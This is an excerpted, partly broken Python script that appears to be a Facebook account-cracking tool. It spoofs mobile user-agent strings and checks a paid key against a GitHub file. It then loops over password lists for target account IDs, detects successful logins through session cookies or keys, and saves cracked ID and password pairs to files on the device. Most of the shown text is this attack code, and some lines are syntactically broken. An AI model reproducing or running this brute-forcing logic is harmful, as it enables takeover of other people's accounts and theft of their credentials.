...
for xd in range(10000):
  ...
  ugm = f"[FBAN/FB4A;FBAV/"+net+".0.0.77.46;FBBV/251145743
FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/"+str(random.randint(000000000,999999999))+";FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/"+zov+";FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
  
 #PK(SAT SHAHIN YT)(SHAHI. ALAM)
...
def menu_apikey():
  ...
  try:
    httpCaht = requests.get(https://github.com/CHUTTA1/FB/blob/main/A.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+94781782649?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ FACEBOOK ● ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ FACEBOOK-OK ] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ FACEBOOK-CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FACEBOOK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [ FACEBOOK-OK ] %s | %s'%(ids,pas))
                                open(f'/sdcard/FACEBOOK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [FACEBOOK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FACEBOOK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ FACEBOOK-CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/FACEBOOK.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
